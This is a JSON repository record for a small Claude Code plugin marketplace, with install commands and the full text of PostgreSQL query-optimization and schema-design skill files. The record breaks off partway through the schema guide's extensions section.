{
  "owner": {
    "id": "francanete",
    "display_name": "Fran Canete",
    "type": "User",
    "avatar_url": "https://avatars.githubusercontent.com/u/65967330?u=137fc25b929f44bcb21599e86a721dabc15d334f&v=4",
    "url": "https://github.com/francanete",
    "bio": "Software Engineer",
    "stats": {
      "total_repos": 1,
      "total_plugins": 2,
      "total_commands": 4,
      "total_skills": 13,
      "total_stars": 0,
      "total_forks": 0
    }
  },
  "repos": [
    {
      "full_name": "francanete/fran-marketplace",
      "url": "https://github.com/francanete/fran-marketplace",
      "description": null,
      "homepage": null,
      "signals": {
        "stars": 0,
        "forks": 0,
        "pushed_at": "2025-12-04T14:53:21Z",
        "created_at": "2025-12-04T10:42:38Z",
        "license": null
      },
      "file_tree": [
        {
          "path": ".claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": ".claude-plugin/marketplace.json",
          "type": "blob",
          "size": 727
        },
        {
          "path": ".claude",
          "type": "tree",
          "size": null
        },
        {
          "path": ".claude/settings.local.json",
          "type": "blob",
          "size": 293
        },
        {
          "path": "README.md",
          "type": "blob",
          "size": 19
        },
        {
          "path": "chrome-extension-expert",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 524
        },
        {
          "path": "chrome-extension-expert/.mcp.json",
          "type": "blob",
          "size": 120
        },
        {
          "path": "chrome-extension-expert/agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/agents/extension-architect.md",
          "type": "blob",
          "size": 4209
        },
        {
          "path": "chrome-extension-expert/agents/extension-debugger.md",
          "type": "blob",
          "size": 7598
        },
        {
          "path": "chrome-extension-expert/agents/extension-developer.md",
          "type": "blob",
          "size": 7242
        },
        {
          "path": "chrome-extension-expert/agents/extension-reviewer.md",
          "type": "blob",
          "size": 6688
        },
        {
          "path": "chrome-extension-expert/agents/store-submission-specialist.md",
          "type": "blob",
          "size": 7106
        },
        {
          "path": "chrome-extension-expert/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/commands/debug-extension.md",
          "type": "blob",
          "size": 6661
        },
        {
          "path": "chrome-extension-expert/commands/scaffold-extension.md",
          "type": "blob",
          "size": 3070
        },
        {
          "path": "chrome-extension-expert/commands/store-checklist.md",
          "type": "blob",
          "size": 4598
        },
        {
          "path": "chrome-extension-expert/commands/validate-manifest.md",
          "type": "blob",
          "size": 2785
        },
        {
          "path": "chrome-extension-expert/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/component-communication",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/component-communication/SKILL.md",
          "type": "blob",
          "size": 12805
        },
        {
          "path": "chrome-extension-expert/skills/debugging-guide",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/debugging-guide/SKILL.md",
          "type": "blob",
          "size": 12302
        },
        {
          "path": "chrome-extension-expert/skills/extension-apis",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/extension-apis/SKILL.md",
          "type": "blob",
          "size": 13159
        },
        {
          "path": "chrome-extension-expert/skills/manifest-v3",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/manifest-v3/SKILL.md",
          "type": "blob",
          "size": 8513
        },
        {
          "path": "chrome-extension-expert/skills/migration-guide",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/migration-guide/SKILL.md",
          "type": "blob",
          "size": 12530
        },
        {
          "path": "chrome-extension-expert/skills/security-best-practices",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/security-best-practices/SKILL.md",
          "type": "blob",
          "size": 12127
        },
        {
          "path": "chrome-extension-expert/skills/side-panel-development",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/side-panel-development/SKILL.md",
          "type": "blob",
          "size": 12240
        },
        {
          "path": "chrome-extension-expert/skills/store-requirements",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/store-requirements/SKILL.md",
          "type": "blob",
          "size": 10635
        },
        {
          "path": "chrome-extension-expert/skills/ui-patterns",
          "type": "tree",
          "size": null
        },
        {
          "path": "chrome-extension-expert/skills/ui-patterns/SKILL.md",
          "type": "blob",
          "size": 15769
        },
        {
          "path": "database-expert",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 401
        },
        {
          "path": "database-expert/.mcp.json",
          "type": "blob",
          "size": 120
        },
        {
          "path": "database-expert/agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/agents/database-architect.md",
          "type": "blob",
          "size": 6111
        },
        {
          "path": "database-expert/agents/database-optimizer.md",
          "type": "blob",
          "size": 1169
        },
        {
          "path": "database-expert/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/skills/postgres-query-optimization",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/skills/postgres-query-optimization/SKILL.md",
          "type": "blob",
          "size": 11660
        },
        {
          "path": "database-expert/skills/postgres-schema-design",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/skills/postgres-schema-design/SKILL.md",
          "type": "blob",
          "size": 18393
        },
        {
          "path": "database-expert/skills/sequelize-migrations",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/skills/sequelize-migrations/SKILL.md",
          "type": "blob",
          "size": 16857
        },
        {
          "path": "database-expert/skills/sequelize-models",
          "type": "tree",
          "size": null
        },
        {
          "path": "database-expert/skills/sequelize-models/SKILL.md",
          "type": "blob",
          "size": 14403
        }
      ],
      "marketplace": {
        "name": "fran-marketplace",
        "version": "1.0.0",
        "description": "Personal plugin marketplace for Fran's development workflows",
        "owner_info": {
          "name": "francanete",
          "url": "https://github.com/francanete"
        },
        "keywords": [],
        "plugins": [
          {
            "name": "database-expert",
            "description": "Database architecture, schema design, and optimization for PostgreSQL and Sequelize",
            "source": "./database-expert",
            "category": "development",
            "version": null,
            "author": null,
            "install_commands": [
              "/plugin marketplace add francanete/fran-marketplace",
              "/plugin install database-expert@fran-marketplace"
            ],
            "signals": {
              "stars": 0,
              "forks": 0,
              "pushed_at": "2025-12-04T14:53:21Z",
              "created_at": "2025-12-04T10:42:38Z",
              "license": null
            },
            "commands": [],
            "skills": [
              {
                "name": "postgres-query-optimization",
                "description": "PostgreSQL query optimization and performance tuning reference. Use when analyzing slow queries, interpreting EXPLAIN output, optimizing indexes, or troubleshooting database performance issues.",
                "path": "database-expert/skills/postgres-query-optimization/SKILL.md",
                "frontmatter": {
                  "name": "postgres-query-optimization",
                  "description": "PostgreSQL query optimization and performance tuning reference. Use when analyzing slow queries, interpreting EXPLAIN output, optimizing indexes, or troubleshooting database performance issues."
                },
                "content": "# PostgreSQL Query Optimization\n\n## EXPLAIN Basics\n\n### Running EXPLAIN\n```sql\n-- Basic plan (no execution)\nEXPLAIN SELECT * FROM orders WHERE customer_id = 123;\n\n-- With actual execution times and row counts\nEXPLAIN ANALYZE SELECT * FROM orders WHERE customer_id = 123;\n\n-- With buffer/IO statistics\nEXPLAIN (ANALYZE, BUFFERS) SELECT * FROM orders WHERE customer_id = 123;\n\n-- Full verbose output with all options\nEXPLAIN (ANALYZE, BUFFERS, VERBOSE, FORMAT JSON) SELECT * FROM orders WHERE customer_id = 123;\n```\n\n### Key Metrics to Watch\n- **actual time**: First row time..last row time in milliseconds\n- **rows**: Estimated vs actual row counts (large differences indicate stale statistics)\n- **loops**: How many times the node executed (important for nested loops)\n- **Buffers**: shared hit (cache) vs shared read (disk)—high read count = slow\n- **Planning Time**: Query planning overhead\n- **Execution Time**: Actual query execution time\n\n## Scan Types\n\n### Sequential Scan (Seq Scan)\nReads every row in the table. Acceptable for:\n- Small tables (<10K rows typically)\n- Queries returning large % of table (>5-10%)\n- No suitable index exists\n\n**Red flag**: Seq Scan on large table with highly selective WHERE clause.\n\n### Index Scan\nUses B-tree index to find rows, then fetches from heap. Best for:\n- Highly selective queries (<5% of rows)\n- Sorted output matching index order\n\n### Index Only Scan\nAnswers query entirely from index (no heap fetch). Requires:\n- All needed columns in index (via INCLUDE or as key columns)\n- Table's visibility map is up-to-date (run VACUUM)\n\n**Goal**: Convert Index Scan → Index Only Scan for read-heavy queries.\n\n### Bitmap Index Scan\nCombines multiple index conditions or handles medium selectivity. Pattern:\n1. Bitmap Index Scan: Build bitmap of matching pages\n2. Bitmap Heap Scan: Fetch pages and recheck conditions\n\nGood for OR conditions and medium selectivity (5-20% of rows).\n\n## Join Types\n\n### Nested Loop\nFor each row in outer table, scan inner table. Best when:\n- Inner table has good index\n- Outer table is small\n- Join returns few rows\n\n### Hash Join\nBuilds hash table from smaller table, probes with larger. Best for:\n- Larger joins without useful indexes\n- Equality joins only\n\nWatch for: `Batches > 1` means hash table spilled to disk (increase `work_mem`).\n\n### Merge Join\nBoth inputs sorted, merge together. Best for:\n- Large sorted datasets\n- Indexes provide sort order\n- Multiple equality conditions\n\n## Common Performance Issues\n\n### N+1 Query Problem\n**Symptom**: Many small queries instead of one efficient join.\n```sql\n-- Bad: N+1 pattern (in application)\nSELECT * FROM orders WHERE id = 1;\nSELECT * FROM order_items WHERE order_id = 1;\nSELECT * FROM orders WHERE id = 2;\nSELECT * FROM order_items WHERE order_id = 2;\n-- ... repeated N times\n\n-- Good: Single query with JOIN\nSELECT o.*, oi.*\nFROM orders o\nJOIN order_items oi ON o.id = oi.order_id\nWHERE o.customer_id = 123;\n```\n\n### Missing Index on FK\n**Symptom**: Slow deletes on parent table, slow joins.\n```sql\n-- Check for missing FK indexes\nSELECT\n    c.conrelid::regclass AS table_name,\n    a.attname AS column_name,\n    c.confrelid::regclass AS referenced_table\nFROM pg_constraint c\nJOIN pg_attribute a ON a.attrelid = c.conrelid AND a.attnum = ANY(c.conkey)\nWHERE c.contype = 'f'\nAND NOT EXISTS (\n    SELECT 1 FROM pg_index i\n    WHERE i.indrelid = c.conrelid\n    AND a.attnum = ANY(i.indkey)\n);\n```\n\n### Over-Indexing\n**Symptom**: Slow inserts/updates, excessive disk usage.\n```sql\n-- Find unused indexes\nSELECT\n    schemaname || '.' || relname AS table,\n    indexrelname AS index,\n    pg_size_pretty(pg_relation_size(i.indexrelid)) AS size,\n    idx_scan AS scans\nFROM pg_stat_user_indexes i\nJOIN pg_index USING (indexrelid)\nWHERE idx_scan = 0\nAND NOT indisunique\nAND NOT indisprimary\nORDER BY pg_relation_size(i.indexrelid) DESC;\n```\n\n### Stale Statistics\n**Symptom**: Planner estimates wildly wrong vs actual rows.\n```sql\n-- Check table statistics freshness\nSELECT\n    schemaname,\n    relname,\n    last_vacuum,\n    last_autovacuum,\n    last_analyze,\n    last_autoanalyze,\n    n_dead_tup\nFROM pg_stat_user_tables\nORDER BY n_dead_tup DESC;\n\n-- Force statistics update\nANALYZE table_name;\nANALYZE VERBOSE table_name;  -- with progress\n```\n\n### Inefficient Pagination\n**Symptom**: OFFSET-based pagination gets slower for higher pages.\n```sql\n-- Bad: OFFSET pagination (rescans all previous rows)\nSELECT * FROM orders ORDER BY created_at DESC OFFSET 10000 LIMIT 20;\n\n-- Good: Keyset/cursor pagination\nSELECT * FROM orders\nWHERE created_at < '2024-01-15T10:30:00Z'\nORDER BY created_at DESC\nLIMIT 20;\n```\n\n## Index Selection Strategy\n\n### When to Create Indexes\n1. **WHERE clause columns**: Frequently filtered columns\n2. **JOIN columns**: Both sides of JOIN conditions\n3. **ORDER BY columns**: For sorted output without extra sort\n4. **Foreign keys**: Always index FK columns (PostgreSQL doesn't auto-create)\n5. **Unique constraints**: Already create indexes automatically\n\n### Index Types by Use Case\n\n| Use Case | Index Type | Example |\n|----------|------------|---------|\n| Equality, range, ORDER BY | B-tree (default) | `CREATE INDEX ON orders (status)` |\n| JSONB containment | GIN | `CREATE INDEX ON docs USING GIN (data)` |\n| Array operations | GIN | `CREATE INDEX ON posts USING GIN (tags)` |\n| Full-text search | GIN | `CREATE INDEX ON articles USING GIN (to_tsvector('english', body))` |\n| Range overlap | GiST | `CREATE INDEX ON bookings USING GiST (daterange)` |\n| Time-series (huge tables) | BRIN | `CREATE INDEX ON logs USING BRIN (created_at)` |\n| Pattern matching (LIKE) | GIN + pg_trgm | `CREATE INDEX ON users USING GIN (name gin_trgm_ops)` |\n\n### Partial Indexes\nIndex only rows matching a condition:\n```sql\n-- Only index active orders (common query pattern)\nCREATE INDEX ON orders (customer_id) WHERE status = 'active';\n\n-- Only index non-null values\nCREATE INDEX ON users (referral_code) WHERE referral_code IS NOT NULL;\n```\n\n### Covering Indexes\nInclude extra columns for index-only scans:\n```sql\n-- Query: SELECT name, email FROM users WHERE id = ?\nCREATE INDEX ON users (id) INCLUDE (name, email);\n```\n\n### Expression Indexes\nIndex computed values:\n```sql\n-- Case-insensitive email lookup\nCREATE INDEX ON users (LOWER(email));\n\n-- JSONB field extraction\nCREATE INDEX ON products ((data->>'category'));\n\n-- Date part extraction\nCREATE INDEX ON events (DATE(created_at));\n```\n\n## pg_stat_statements\n\nEssential extension for query performance monitoring.\n\n### Enable and Configure\n```sql\n-- In postgresql.conf\nshared_preload_libraries = 'pg_stat_statements'\npg_stat_statements.track = all\n\n-- Create extension\nCREATE EXTENSION IF NOT EXISTS pg_stat_statements;\n```\n\n### Find Slowest Queries\n```sql\n-- Top 10 by total time\nSELECT\n    calls,\n    round(total_exec_time::numeric, 2) AS total_time_ms,\n    round(mean_exec_time::numeric, 2) AS mean_time_ms,\n    round((100 * total_exec_time / sum(total_exec_time) OVER ())::numeric, 2) AS percent_total,\n    query\nFROM pg_stat_statements\nORDER BY total_exec_time DESC\nLIMIT 10;\n\n-- Queries with high variance (inconsistent performance)\nSELECT\n    calls,\n    round(mean_exec_time::numeric, 2) AS mean_ms,\n    round(stddev_exec_time::numeric, 2) AS stddev_ms,\n    query\nFROM pg_stat_statements\nWHERE calls > 100\nORDER BY stddev_exec_time DESC\nLIMIT 10;\n```\n\n### Reset Statistics\n```sql\nSELECT pg_stat_statements_reset();\n```\n\n## Lock Monitoring\n\n### Current Locks\n```sql\nSELECT\n    pg_class.relname,\n    pg_locks.mode,\n    pg_locks.granted,\n    pg_stat_activity.query,\n    pg_stat_activity.pid\nFROM pg_locks\nJOIN pg_class ON pg_locks.relation = pg_class.oid\nJOIN pg_stat_activity ON pg_locks.pid = pg_stat_activity.pid\nWHERE pg_class.relname NOT LIKE 'pg_%'\nORDER BY pg_class.relname;\n```\n\n### Blocked Queries\n```sql\nSELECT\n    blocked.pid AS blocked_pid,\n    blocked.query AS blocked_query,\n    blocking.pid AS blocking_pid,\n    blocking.query AS blocking_query,\n    now() - blocked.query_start AS blocked_duration\nFROM pg_stat_activity blocked\nJOIN pg_locks blocked_locks ON blocked.pid = blocked_locks.pid\nJOIN pg_locks blocking_locks ON blocked_locks.locktype = blocking_locks.locktype\n    AND blocked_locks.relation = blocking_locks.relation\n    AND blocked_locks.pid != blocking_locks.pid\nJOIN pg_stat_activity blocking ON blocking_locks.pid = blocking.pid\nWHERE NOT blocked_locks.granted;\n```\n\n### Long-Running Transactions\n```sql\nSELECT\n    pid,\n    now() - xact_start AS duration,\n    state,\n    query\nFROM pg_stat_activity\nWHERE state != 'idle'\nAND xact_start < now() - interval '5 minutes'\nORDER BY duration DESC;\n```\n\n## Connection Management\n\n### Current Connections\n```sql\nSELECT\n    state,\n    COUNT(*) AS count,\n    MAX(now() - state_change) AS max_duration\nFROM pg_stat_activity\nGROUP BY state;\n```\n\n### Connection Pool Sizing\nRule of thumb: `connections = (core_count * 2) + effective_spindle_count`\n\nFor most web apps with SSD: 10-20 connections per CPU core is reasonable.\n\n### Idle Connection Cleanup\n```sql\n-- Terminate idle connections older than 10 minutes\nSELECT pg_terminate_backend(pid)\nFROM pg_stat_activity\nWHERE state = 'idle'\nAND state_change < now() - interval '10 minutes';\n```\n\n## Memory Settings\n\n### work_mem\nMemory per operation (sort, hash). Default 4MB is often too low.\n```sql\n-- Check current setting\nSHOW work_mem;\n\n-- Set for session (for heavy analytical queries)\nSET work_mem = '256MB';\n\n-- Check if sorts are spilling to disk\nEXPLAIN (ANALYZE, BUFFERS) SELECT ... ORDER BY ...;\n-- Look for: \"Sort Method: external merge Disk:\"\n```\n\n### shared_buffers\nMain memory cache. Start with 25% of system RAM.\n\n### effective_cache_size\nHint to planner about total cache (OS + PostgreSQL). Set to ~75% of RAM.\n\n## Query Patterns to Avoid\n\n### SELECT *\nFetch only needed columns for smaller data transfer and potential index-only scans.\n\n### Functions on Indexed Columns\n```sql\n-- Bad: Can't use index on created_at\nWHERE DATE(created_at) = '2024-01-15'\n\n-- Good: Range query uses index\nWHERE created_at >= '2024-01-15' AND created_at < '2024-01-16'\n```\n\n### OR with Different Columns\n```sql\n-- Bad: Often causes Seq Scan\nWHERE status = 'active' OR customer_id = 123\n\n-- Better: UNION of indexed queries\nSELECT * FROM orders WHERE status = 'active'\nUNION ALL\nSELECT * FROM orders WHERE customer_id = 123 AND status != 'active'\n```\n\n### DISTINCT When Not Needed\nDISTINCT adds sort/hash overhead. Ensure your query design eliminates duplicates naturally through proper joins.\n\n### Correlated Subqueries\n```sql\n-- Bad: Executes subquery for each row\nSELECT * FROM orders o\nWHERE total > (SELECT AVG(total) FROM orders WHERE customer_id = o.customer_id);\n\n-- Good: Use window function or CTE\nWITH customer_avg AS (\n    SELECT customer_id, AVG(total) AS avg_total\n    FROM orders\n    GROUP BY customer_id\n)\nSELECT o.*\nFROM orders o\nJOIN customer_avg ca ON o.customer_id = ca.customer_id\nWHERE o.total > ca.avg_total;\n```\n\n## Performance Checklist\n\n1. **EXPLAIN ANALYZE** your slow queries\n2. Check estimated vs actual rows (stale stats?)\n3. Look for Seq Scans on large tables\n4. Verify indexes exist for WHERE/JOIN columns\n5. Check for missing FK indexes\n6. Review work_mem for sorts spilling to disk\n7. Consider partial/covering indexes for hot queries\n8. Use keyset pagination instead of OFFSET\n9. Enable pg_stat_statements for ongoing monitoring\n10. Regular VACUUM ANALYZE for fresh statistics"
              },
              {
                "name": "postgres-schema-design",
                "description": "Comprehensive PostgreSQL-specific table design reference covering data types, indexing, constraints, performance patterns, and advanced features. Use when designing database schemas, creating tables, or reviewing database structure.",
                "path": "database-expert/skills/postgres-schema-design/SKILL.md",
                "frontmatter": {
                  "name": "postgres-schema-design",
                  "description": "Comprehensive PostgreSQL-specific table design reference covering data types, indexing, constraints, performance patterns, and advanced features. Use when designing database schemas, creating tables, or reviewing database structure."
                },
                "content": "# PostgreSQL Table Design\n\n## Core Rules\n\n- Define a **PRIMARY KEY** for reference tables (users, orders, etc.). Not always needed for time-series/event/log data. When used, prefer `BIGINT GENERATED ALWAYS AS IDENTITY`; use `UUID` only when global uniqueness/opacity is needed.\n- **Normalize first (to 3NF)** to eliminate data redundancy and update anomalies; denormalize **only** for measured, high-ROI reads where join performance is proven problematic. Premature denormalization creates maintenance burden.\n- Add **NOT NULL** everywhere it's semantically required; use **DEFAULT**s for common values.\n- Create **indexes for access paths you actually query**: PK/unique (auto), **FK columns (manual!)**, frequent filters/sorts, and join keys.\n- Prefer **TIMESTAMPTZ** for event time; **NUMERIC** for money; **TEXT** for strings; **BIGINT** for integer values, **DOUBLE PRECISION** for floats (or `NUMERIC` for exact decimal arithmetic).\n\n## PostgreSQL Gotchas\n\n- **Identifiers**: unquoted → lowercased. Avoid quoted/mixed-case names. Convention: use `snake_case` for table/column names.\n- **Unique + NULLs**: UNIQUE allows multiple NULLs. Use `UNIQUE (...) NULLS NOT DISTINCT` (PG15+) to restrict to one NULL.\n- **FK indexes**: PostgreSQL **does not** auto-index FK columns. Add them manually.\n- **No silent coercions**: length/precision overflows error out (no truncation). Example: inserting 999 into `NUMERIC(2,0)` fails with error, unlike some databases that silently truncate or round.\n- **Sequences/identity have gaps** (normal; don't \"fix\"). Rollbacks, crashes, and concurrent transactions create gaps in ID sequences (1, 2, 5, 6...). This is expected behavior—don't try to make IDs consecutive.\n- **Heap storage**: no clustered PK by default (unlike SQL Server/MySQL InnoDB); `CLUSTER` is one-off reorganization, not maintained on subsequent inserts. Row order on disk is insertion order unless explicitly clustered.\n- **MVCC**: updates/deletes leave dead tuples; vacuum handles them—design to avoid hot wide-row churn.\n\n## Data Types\n\n### Preferred Types\n\n- **IDs**: `BIGINT GENERATED ALWAYS AS IDENTITY` preferred (`GENERATED BY DEFAULT` also fine); `UUID` when merging/federating/used in a distributed system or for opaque IDs. Generate with `uuidv7()` (preferred if using PG18+) or `gen_random_uuid()` (if using an older PG version).\n- **Integers**: prefer `BIGINT` unless storage space is critical; `INTEGER` for smaller ranges; avoid `SMALLINT` unless constrained.\n- **Floats**: prefer `DOUBLE PRECISION` over `REAL` unless storage space is critical. Use `NUMERIC` for exact decimal arithmetic.\n- **Strings**: prefer `TEXT`; if length limits needed, use `CHECK (LENGTH(col) <= n)` instead of `VARCHAR(n)`; avoid `CHAR(n)`. Use `BYTEA` for binary data.\n- **Money**: `NUMERIC(p,s)` (never float).\n- **Time**: `TIMESTAMPTZ` for timestamps; `DATE` for date-only; `INTERVAL` for durations. Avoid `TIMESTAMP` (without timezone). Use `now()` for transaction start time, `clock_timestamp()` for current wall-clock time.\n- **Booleans**: `BOOLEAN` with `NOT NULL` constraint unless tri-state values are required.\n- **Enums**: `CREATE TYPE ... AS ENUM` for small, stable sets (e.g. US states, days of week). For business-logic-driven and evolving values (e.g. order statuses) → use TEXT (or INT) + CHECK or lookup table.\n- **Arrays**: `TEXT[]`, `INTEGER[]`, etc. Use for ordered lists where you query elements. Index with **GIN** for containment (`@>`, `<@`) and overlap (`&&`) queries. Access: `arr[1]` (1-indexed), `arr[1:3]` (slicing). Good for tags, categories; avoid for relations—use junction tables instead. Literal syntax: `'{val1,val2}'` or `ARRAY[val1,val2]`.\n- **Range types**: `daterange`, `numrange`, `tstzrange` for intervals. Support overlap (`&&`), containment (`@>`), operators. Index with **GiST**. Good for scheduling, versioning, numeric ranges. Pick a bounds scheme and use it consistently; prefer `[)` (inclusive/exclusive) by default.\n- **Network types**: `INET` for IP addresses, `CIDR` for network ranges, `MACADDR` for MAC addresses. Support network operators (`<<`, `>>`, `&&`).\n- **Geometric types**: `POINT`, `LINE`, `POLYGON`, `CIRCLE` for 2D spatial data. Index with **GiST**. Consider **PostGIS** for advanced spatial features.\n- **Text search**: `TSVECTOR` for full-text search documents, `TSQUERY` for search queries. Index `tsvector` with **GIN**. Always specify language: `to_tsvector('english', col)` and `to_tsquery('english', 'query')`. Never use single-argument versions.\n- **Domain types**: `CREATE DOMAIN email AS TEXT CHECK (VALUE ~ '^[^@]+@[^@]+\\.[^@]+$')` for reusable custom types with validation. Enforces constraints across tables.\n- **Composite types**: `CREATE TYPE address AS (street TEXT, city TEXT, zip TEXT)` for structured data within columns. Access with `(col).field` syntax.\n- **JSONB**: preferred over JSON; index with **GIN**. Use only for optional/semi-structured attrs. ONLY use JSON if the original ordering of the contents MUST be preserved.\n- **Vector types**: `vector` type by `pgvector` for vector similarity search for embeddings.\n\n### Types to AVOID\n\n- DO NOT use `timestamp` (without time zone); DO use `timestamptz` instead.\n- DO NOT use `char(n)` or `varchar(n)`; DO use `text` instead.\n- DO NOT use `money` type; DO use `numeric` instead.\n- DO NOT use `timetz` type; DO use `timestamptz` instead.\n- DO NOT use `timestamptz(0)` or any other precision specification; DO use `timestamptz` instead.\n- DO NOT use `serial` type; DO use `generated always as identity` instead.\n\n### TOAST Storage\n\nLarge strings/binary (>2KB default threshold) automatically stored in TOAST with compression:\n- `PLAIN` (no TOAST)\n- `EXTENDED` (compress + out-of-line) - default, usually optimal\n- `EXTERNAL` (out-of-line, no compress)\n- `MAIN` (compress, keep in-line if possible)\n\nControl with `ALTER TABLE tbl ALTER COLUMN col SET STORAGE strategy` and `ALTER TABLE tbl SET (toast_tuple_target = 4096)` for threshold.\n\n### Case-Insensitive Text\n\nFor locale/accent handling use non-deterministic collations; for plain ASCII use expression indexes on `LOWER(col)` (preferred unless column needs case-insensitive PK/FK/UNIQUE) or `CITEXT`.\n\n## Table Types\n\n- **Regular**: default; fully durable, logged.\n- **TEMPORARY**: session-scoped, auto-dropped, not logged. Faster for scratch work.\n- **UNLOGGED**: persistent but not crash-safe. Faster writes; good for caches/staging.\n\n## Row-Level Security\n\nEnable with `ALTER TABLE tbl ENABLE ROW LEVEL SECURITY`. Create policies:\n```sql\nCREATE POLICY user_access ON orders FOR SELECT TO app_users USING (user_id = current_user_id());\n```\nBuilt-in user-based access control at the row level.\n\n## Constraints\n\n- **PK**: implicit UNIQUE + NOT NULL; creates a B-tree index.\n- **FK**: specify `ON DELETE/UPDATE` action (`CASCADE`, `RESTRICT`, `SET NULL`, `SET DEFAULT`). Add explicit index on referencing column—speeds up joins and prevents locking issues on parent deletes/updates. Use `DEFERRABLE INITIALLY DEFERRED` for circular FK dependencies checked at transaction end.\n- **UNIQUE**: creates a B-tree index; allows multiple NULLs unless `NULLS NOT DISTINCT` (PG15+). Standard behavior: `(1, NULL)` and `(1, NULL)` are allowed. With `NULLS NOT DISTINCT`: only one `(1, NULL)` allowed. Prefer `NULLS NOT DISTINCT` unless you specifically need duplicate NULLs.\n- **CHECK**: row-local constraints; NULL values pass the check (three-valued logic). Example: `CHECK (price > 0)` allows NULL prices. Combine with `NOT NULL` to enforce: `price NUMERIC NOT NULL CHECK (price > 0)`.\n- **EXCLUDE**: prevents overlapping values using operators. `EXCLUDE USING gist (room_id WITH =, booking_period WITH &&)` prevents double-booking rooms. Requires appropriate index type (often GiST).\n\n## Indexing\n\n- **B-tree**: default for equality/range queries (`=`, `<`, `>`, `BETWEEN`, `ORDER BY`)\n- **Composite**: order matters—index used if equality on leftmost prefix (`WHERE a = ? AND b > ?` uses index on `(a,b)`, but `WHERE b = ?` does not). Put most selective/frequently filtered columns first.\n- **Covering**: `CREATE INDEX ON tbl (id) INCLUDE (name, email)` - includes non-key columns for index-only scans without visiting table.\n- **Partial**: for hot subsets (`WHERE status = 'active'` → `CREATE INDEX ON tbl (user_id) WHERE status = 'active'`). Any query with `status = 'active'` can use this index.\n- **Expression**: for computed search keys (`CREATE INDEX ON tbl (LOWER(email))`). Expression must match exactly in WHERE clause: `WHERE LOWER(email) = 'user@example.com'`.\n- **GIN**: JSONB containment/existence, arrays (`@>`, `?`), full-text search (`@@`)\n- **GiST**: ranges, geometry, exclusion constraints\n- **BRIN**: very large, naturally ordered data (time-series)—minimal storage overhead. Effective when row order on disk correlates with indexed column (insertion order or after `CLUSTER`).\n\n## Partitioning\n\nUse for very large tables (>100M rows) where queries consistently filter on partition key (often time/date). Alternate use: data maintenance where data is pruned or bulk replaced periodically.\n\n- **RANGE**: common for time-series (`PARTITION BY RANGE (created_at)`). Create partitions: `CREATE TABLE logs_2024_01 PARTITION OF logs FOR VALUES FROM ('2024-01-01') TO ('2024-02-01')`. **TimescaleDB** automates time-based or ID-based partitioning with retention policies and compression.\n- **LIST**: for discrete values (`PARTITION BY LIST (region)`). Example: `FOR VALUES IN ('us-east', 'us-west')`.\n- **HASH**: for even distribution when no natural key (`PARTITION BY HASH (user_id)`). Creates N partitions with modulus.\n- **Constraint exclusion**: requires `CHECK` constraints on partitions for query planner to prune. Auto-created for declarative partitioning (PG10+).\n\nPrefer declarative partitioning or hypertables. Do NOT use table inheritance.\n\n**Limitations**: no global UNIQUE constraints—include partition key in PK/UNIQUE. FKs from partitioned tables not supported; use triggers.\n\n## Special Considerations\n\n### Update-Heavy Tables\n\n- **Separate hot/cold columns**—put frequently updated columns in separate table to minimize bloat.\n- **Use `fillfactor=90`** to leave space for HOT updates that avoid index maintenance.\n- **Avoid updating indexed columns**—prevents beneficial HOT updates.\n- **Partition by update patterns**—separate frequently updated rows in a different partition from stable data.\n\n### Insert-Heavy Workloads\n\n- **Minimize indexes**—only create what you query; every index slows inserts.\n- **Use `COPY` or multi-row `INSERT`** instead of single-row inserts.\n- **UNLOGGED tables** for rebuildable staging data—much faster writes.\n- **Defer index creation** for bulk loads—drop index, load data, recreate indexes.\n- **Partition by time/hash** to distribute load. **TimescaleDB** automates partitioning and compression of insert-heavy data.\n- **Use a natural key for primary key** such as a (timestamp, device_id) if enforcing global uniqueness is important—many insert-heavy tables don't need a primary key at all.\n- If you do need a surrogate key, **Prefer `BIGINT GENERATED ALWAYS AS IDENTITY` over `UUID`**.\n\n### Upsert-Friendly Design\n\n- **Requires UNIQUE index** on conflict target columns—`ON CONFLICT (col1, col2)` needs exact matching unique index (partial indexes don't work).\n- **Use `EXCLUDED.column`** to reference would-be-inserted values; only update columns that actually changed to reduce write overhead.\n- **`DO NOTHING` faster** than `DO UPDATE` when no actual update needed.\n\n### Safe Schema Evolution\n\n- **Transactional DDL**: most DDL operations can run in transactions and be rolled back—`BEGIN; ALTER TABLE...; ROLLBACK;` for safe testing.\n- **Concurrent index creation**: `CREATE INDEX CONCURRENTLY` avoids blocking writes but can't run in transactions.\n- **Volatile defaults cause rewrites**: adding `NOT NULL` columns with volatile defaults (e.g., `now()`, `gen_random_uuid()`) rewrites entire table. Non-volatile defaults are fast.\n- **Drop constraints before columns**: `ALTER TABLE DROP CONSTRAINT` then `DROP COLUMN` to avoid dependency issues.\n- **Function signature changes**: `CREATE OR REPLACE` with different arguments creates overloads, not replacements. DROP old version if no overload desired.\n\n## Generated Columns\n\n`... GENERATED ALWAYS AS (<expr>) STORED` for computed, indexable fields. PG18+ adds `VIRTUAL` columns (computed on read, not stored).\n\n## Extensions\n\n- **`pgcrypto`**: 